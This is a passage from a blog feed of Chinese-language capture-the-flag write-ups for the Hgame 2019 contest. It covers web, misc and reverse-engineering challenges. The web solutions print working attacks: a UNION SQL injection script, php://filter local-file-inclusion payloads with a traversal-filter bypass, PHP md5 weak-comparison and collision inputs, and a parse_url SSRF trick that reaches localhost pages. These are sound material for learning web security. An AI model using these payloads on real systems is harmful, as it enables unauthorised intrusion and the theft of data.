    <content type="html"><![CDATA[<h2 id="i-web"><a class="markdownIt-Anchor" href="#i-web"></a> Ⅰ WEB</h2><h3 id="2-sqli-1"><a class="markdownIt-Anchor" href="#2-sqli-1"></a> 2. sqli-1</h3><h4 id="question"><a class="markdownIt-Anchor" href="#question"></a> Question</h4><p>Description</p><p>sql 注入 参数是id</p><p>URL</p><p><a href="http://118.89.111.179:3000/" target="_blank" rel="noopener">http://118.89.111.179:3000/</a></p><p>Base Score</p><p>150</p><h4 id="answer"><a class="markdownIt-Anchor" href="#answer"></a> Answer</h4><p>主要就是用union进行进一步寻找，python代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span><span class="params">(target)</span>:</span></span><br><span class="line">    candidate = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        plaintext = str(candidate)</span><br><span class="line">        hash = hashlib.md5(plaintext.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hash[:<span class="number">4</span>] == target:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">        candidate = candidate + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.111.179:3000/'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">md5 = MD5(r.text.split(<span class="string">'= '</span>)[<span class="number">1</span>][:<span class="number">4</span>])</span><br><span class="line">id = <span class="string">"1 union select schema_name from information_schema.schemata"</span></span><br><span class="line">id = <span class="string">'1 union select table_name from information_schema.tables where table_schema=\'hgame\''</span></span><br><span class="line">id = <span class="string">'1 union select column_name from information_schema.columns where table_name=\'f1l1l1l1g\''</span></span><br><span class="line">                                                                    +<span class="string">' and table_schema=\'hgame\''</span></span><br><span class="line">id = <span class="string">'1 union select f14444444g from f1l1l1l1g'</span></span><br><span class="line">g = requests.get(url, params=&#123;<span class="string">'id'</span>: id, <span class="string">'code'</span>: md5&#125;, cookies=r.cookies)</span><br><span class="line">print(g.text.split(<span class="string">'&lt;br&gt;'</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>代码中的4个id就是4步尝试：一步步根据输出得到</p><p>下面的<code>hgame</code>,<code>f1l1l1l1g</code>,<code>f14444444g</code></p><p>最后得到flag:<code>hgame{sql1_1s_iNterest1ng}</code></p><h2 id="iv-misc"><a class="markdownIt-Anchor" href="#iv-misc"></a> Ⅳ MISC</h2><h3 id="1-时至今日你仍然是我的光芒"><a class="markdownIt-Anchor" href="#1-时至今日你仍然是我的光芒"></a> 1. 时至今日，你仍然是我的光芒</h3><h4 id="question-2"><a class="markdownIt-Anchor" href="#question-2"></a> Question</h4><p>Description</p><p>你知道Kali下有个强大的字典叫rockyou.txt嘛?密码为 sec.*<br />hint1:DeEgger Embedder<br />hint2:outguess</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/stuff/flag.zip" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/stuff/flag.zip</a></p><p>Base Score</p><p>150</p><h4 id="answer-2"><a class="markdownIt-Anchor" href="#answer-2"></a> Answer</h4><p>打开flag.zip，里面有一个flag.mp4。</p><p>首先用DeEgger Embedder的Extract Files对flag.mp4进行Extract，得到了一个flag - extracted.exe。</p><p>但是用UE打开一看，应该是个jpg，所以文件名改为flag.jpg，果然图片也正常的显示了。</p><p>然后按照提示用rockyou.txt中所以sec开头的密码，对flag.jpg执行outguess</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    File(<span class="string">"rockyou.txt"</span>).readLines()</span><br><span class="line">        .filter &#123; it.startsWith(<span class="string">"sec"</span>) &#125;.forEach &#123; key -&gt;</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">                .exec(<span class="string">"outguess -k <span class="variable">$key</span> -r flag.jpg flag.txt"</span>)</span><br><span class="line">            File(<span class="string">"flag.txt"</span>).readLines().forEach &#123;</span><br><span class="line">                <span class="keyword">if</span> (it.startsWith(<span class="string">"hgame"</span>)) &#123;</span><br><span class="line">                    println(it)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完毕输出<code>hgame{Whataya_Want_From_Me}</code></p><h3 id="2-至少像那雪一样"><a class="markdownIt-Anchor" href="#2-至少像那雪一样"></a> 2. 至少像那雪一样</h3><h4 id="question-3"><a class="markdownIt-Anchor" href="#question-3"></a> Question</h4><p>Description</p><p>出题人想不好题目描述了</p><p>URL</p><p><a href="http://plqfgjy5a.bkt.clouddn.com/%E8%87%B3%E5%B0%91%E5%83%8F%E9%82%A3%E9%9B%AA%E4%B8%80%E6%A0%B7.jpg" target="_blank" rel="noopener">http://plqfgjy5a.bkt.clouddn.com/至少像那雪一样.jpg</a></p><p>Base Score</p><p>150</p><h4 id="answer-3"><a class="markdownIt-Anchor" href="#answer-3"></a> Answer</h4><p>一把用binwalk打开jpg，发现后面跟了一个zip。</p><p>然后用UE就从jpg的结尾切开，分成两个文件，得到一个图片和一个压缩包。</p><p>压缩包里正好有加密了图片，所以明文攻击，拿到压缩包里的flag.txt.</p><p>用VSCode打开,看十六进制:</p><blockquote><p>00000000: 09 20 20 09 20 09 09 09 09 20 20 09 09 20 20 20    …</p><p>00000010: 09 20 20 09 09 09 09 20 09 20 20 09 20 20 09 20    …</p><p>00000020: 09 20 20 09 09 20 09 20 09 20 20 20 20 09 20 20    …</p><p>00000030: 09 20 09 09 09 09 09 20 09 20 20 20 09 20 09 09    …</p><p>00000040: 09 20 09 20 20 20 20 20 09 20 09 09 20 20 09 09    …</p><p>00000050: 09 20 20 09 09 20 09 20 09 20 20 09 09 09 09 20    …</p><p>00000060: 09 09 20 20 09 20 09 20 09 20 20 20 09 20 09 09    …</p><p>00000070: 09 20 09 20 20 20 20 20 09 20 09 09 20 20 09 09    …</p><p>00000080: 09 09 20 20 09 09 09 20 09 20 20 09 20 09 20 20    …</p><p>00000090: 09 20 20 09 09 20 09 20 09 20 09 20 20 20 20 20    …</p><p>000000a0: 09 20 20 20 09 20 09 09 09 20 09 09 20 09 09 09    …</p><p>000000b0: 09 20 20 09 09 09 09 20 09 20 20 20 09 20 09 09    …</p><p>000000c0: 09 20 09 20 20 20 20 20 09 20 20 20 09 09 20 20    …</p><p>000000d0: 09 20 20 09 20 20 20 09 09 09 20 20 09 09 09 09    …</p><p>000000e0: 09 20 20 20 09 20 20 20 09 20 20 20 20 20 09 20    …</p></blockquote><p>然后尝试了一下按照09-&gt;0,20-&gt;1,变成二进制,再按照ASCII,</p><p>得到flag就是<code>hgame{At_Lea5t_L1ke_tHat_sn0w}</code></p><h3 id="3-旧时记忆"><a class="markdownIt-Anchor" href="#3-旧时记忆"></a> 3. 旧时记忆</h3><h4 id="question-4"><a class="markdownIt-Anchor" href="#question-4"></a> Question</h4><p>Description</p><p>愉快的送（nao）分（dong）题，大家一起来学历史吧，结果加上hgame{}（字母均为大写）<br />hint:memory<br />又一个hint:存储器</p><p>URL</p><p><a href="http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg" target="_blank" rel="noopener">http://plqfgjy5a.bkt.clouddn.com/旧时记忆.jpg</a></p><p>Base Score</p><p>100</p><h4 id="answer-4"><a class="markdownIt-Anchor" href="#answer-4"></a> Answer</h4><p><img src="http://plqfgjy5a.bkt.clouddn.com/%E6%97%A7%E6%97%B6%E8%AE%B0%E5%BF%86.jpg" alt="" /></p><p>这个图片就是一个打孔卡,然后按照wiki上打孔卡的那个图片翻译下来就是</p><blockquote><p>0LD_DAY5%M3MORY</p></blockquote><p>所以flag就是<code>hgame{0LD_DAY5%M3MORY}</code></p><h3 id="4-听听音乐"><a class="markdownIt-Anchor" href="#4-听听音乐"></a> 4. 听听音乐？</h3><h4 id="question-5"><a class="markdownIt-Anchor" href="#question-5"></a> Question</h4><p>Description</p><p>一首MP3,好好听哦，flag由大写英文字母、数字以及下划线组成，记得添加hgame{}</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/a80509c91f30027ca21b069e7d94fa7718ab2e40684628c41943bf647f3d7c6a/stego.mp3</a></p><p>Base Score</p><p>150</p><h4 id="answer-5"><a class="markdownIt-Anchor" href="#answer-5"></a> Answer</h4><p>打开后拿到中间特殊的一段滴滴滴的声音：</p><p><img src="/images/hgame-week3/dididi.png" alt="dididi" /></p><p>按照莫斯电码，就是</p><blockquote><p>FLAG:1T_JU5T_4_EASY_WAV</p></blockquote><p>所以flag就是<code>hgame{1T_JU5T_4_EASY_WAV}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;i-web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#i-web&quot;&gt;&lt;/a&gt; Ⅰ WEB&lt;/h2&gt;
&lt;h3 id=&quot;2-sqli-1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#2-sqli-1&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.rainbowyang.moe/categories/CTF/"/>
    
    
      <category term="WriteUp" scheme="https://blog.rainbowyang.moe/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Writeup of Hgame 2019 Week2</title>
    <link href="https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week2.html"/>
    <id>https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week2.html</id>
    <published>2019-02-16T06:15:54.000Z</published>
    <updated>2020-07-14T08:14:09.905Z</updated>
    
    <content type="html"><![CDATA[<p>过年的week2有点咸鱼了。。。</p><h2 id="i-web"><a class="markdownIt-Anchor" href="#i-web"></a> Ⅰ WEB</h2><h3 id="1-easy_php"><a class="markdownIt-Anchor" href="#1-easy_php"></a> 1. easy_php</h3><h4 id="question"><a class="markdownIt-Anchor" href="#question"></a> Question</h4><p>Description</p><p>代码审计♂第二弹</p><p>URL</p><p><a href="http://118.24.25.25:9999/easyphp/index.html" target="_blank" rel="noopener">http://118.24.25.25:9999/easyphp/index.html</a></p><p>Base Score</p><p>150</p><h4 id="answer"><a class="markdownIt-Anchor" href="#answer"></a> Answer</h4><p>（这么一题写了好久好久，宝宝心里哭）</p><p>打开网页，发现标题是<code>where is my robots</code></p><p>然后看看<code>robots.txt</code>又是<code>img/index.php</code>,</p><p>所以打开http://118.24.25.25:9999/easyphp/img/index.php</p><p>然后拿到了一下东西。</p><p>((((开头一个什么奇怪的照片，我啥都没看懂，别来问我。。。（手动滑稽）))))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">$img = $_GET[<span class="string">'img'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">$img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);     </span><br><span class="line"><span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个显然就是注入+LFI，</p><p>然后我又发现了http://118.24.25.25:9999/easyphp/flag.html,</p><p>打开了是<code>maybe_you_should_think_think</code>。</p><p>但是幺蛾子肯定就在这里，我要看源码。</p><p>所以打开</p><blockquote><p><a href="http://118.24.25.25:9999/easyphp/img/?img=php://filter/convert.base64-encode/resource=....//flag" target="_blank" rel="noopener">http://118.24.25.25:9999/easyphp/img/?img=php://filter/convert.base64-encode/resource=....//flag</a></p></blockquote><p>(<code>../</code>双写，是为了解决替换问题。)</p><p>拿到了源码的base64：</p><blockquote><p>PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK</p></blockquote><p>解码得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//$flag = 'hgame&#123;You_4re_So_g0od&#125;';</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"maybe_you_should_think_think"</span>;</span><br></pre></td></tr></table></figure><p>所以就是flag就是<code>hgame{You_4re_So_g0od}</code></p><p>(莫名奇妙，弄了好久，难受啊）</p><p>((首尾呼应有没有！))</p><h3 id="2-php-trick"><a class="markdownIt-Anchor" href="#2-php-trick"></a> 2. php trick</h3><h4 id="question-2"><a class="markdownIt-Anchor" href="#question-2"></a> Question</h4><p>Description</p><p>some php tricks</p><p>URL</p><p><a href="http://118.24.3.214:3001/" target="_blank" rel="noopener">http://118.24.3.214:3001</a></p><p>Base Score</p><p>200</p><h4 id="answer-2"><a class="markdownIt-Anchor" href="#answer-2"></a> Answer</h4><p>打开网页，看到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br><span class="line">step <span class="number">1</span> fail</span><br></pre></td></tr></table></figure><p>那么就一步步来吧</p><p>第一步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然if里面得条件都是要不满足的，才不会die。</p><p>也就是<code>str1</code>！=<code>str2</code>，然后MD5相等。</p><p>因为弱类型的存在，所以可以这样</p><blockquote><p>str1=240610708</p><p>str2=QNKCDZO</p></blockquote><p>这两个的md5都是<code>0e</code>开头的，所以最后会相等。</p><hr /><p>第二步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是MD5碰撞了</p><blockquote><p>str3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>str4=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p></blockquote><hr /><p>第三步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>H.game[]=</p></blockquote><p>数组一把过，爽！</p><hr /><p>第四步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">...</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是用curl打开一个网页</p><p>可以看到最上面有一个注释</p><blockquote><p><a href="//admin.php" target="_blank" rel="noopener">//admin.php</a></p></blockquote><p>直接打开可以看到</p><blockquote><p>only localhost can see it</p></blockquote><p>所以curl要打开的就是这个网页。</p><p>所以先要绕过host和scheme的检查，然后访问本地的admin.php</p><p>所以构造一下参数</p><blockquote><p>url=http://@127.0.0.1:80@www.baidu.com/admin.php</p></blockquote><p>然后就看到了admin.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>东西肯定就在flag.php了，然后就在最后加上神奇的filter之base64</p><p>然后最后的网址就是</p><blockquote><p><a href="http://118.24.3.214:3001/?str1=240610708&amp;str2=QNKCDZO&amp;str3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;str4=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;H.game%5B%5D=&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/convert.base64-encode/resource=flag.php" target="_blank" rel="noopener">http://118.24.3.214:3001/?str1=240610708&amp;str2=QNKCDZO&amp;str3=M�h��\ �r�w{r��o���V�J%3D�x&gt;{�����(K�n�KU�_Bu��Igm��U]�`�_��&amp;str4=M�h��\ �r�w{r��o���V�J%3D�x&gt;{�����(K�n�KU�_Bu��Igm���]�`�_��&amp;H.game[]=&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/convert.base64-encode/resource=flag.php</a></p></blockquote><p>这样的。</p><p>然后拿到flag.php的base64</p><blockquote><p>PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo=</p></blockquote><p>解码得</p><blockquote><?php $flag = hgame{ThEr4_Ar4_s0m4_Php_Tr1cks} ?></blockquote><p>所以flag就是<code>hgame{ThEr4_Ar4_s0m4_Php_Tr1cks}</code></p><h2 id="ii-re"><a class="markdownIt-Anchor" href="#ii-re"></a> Ⅱ RE</h2><h4 id="5pro的python教室二"><a class="markdownIt-Anchor" href="#5pro的python教室二"></a> 5.Pro的Python教室(二)</h4><h4 id="question-3"><a class="markdownIt-Anchor" href="#question-3"></a> Question</h4><p>Description</p><p>Little Difficult Python Reverse.</p><p>URL</p><p><a href="http://plqbnxx54.bkt.clouddn.com/secend.pyc" target="_blank" rel="noopener">http://plqbnxx54.bkt.clouddn.com/secend.pyc</a></p><p>Base Score</p><p>100</p><h4 id="answer-3"><a class="markdownIt-Anchor" href="#answer-3"></a> Answer</h4><p>不废话，反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 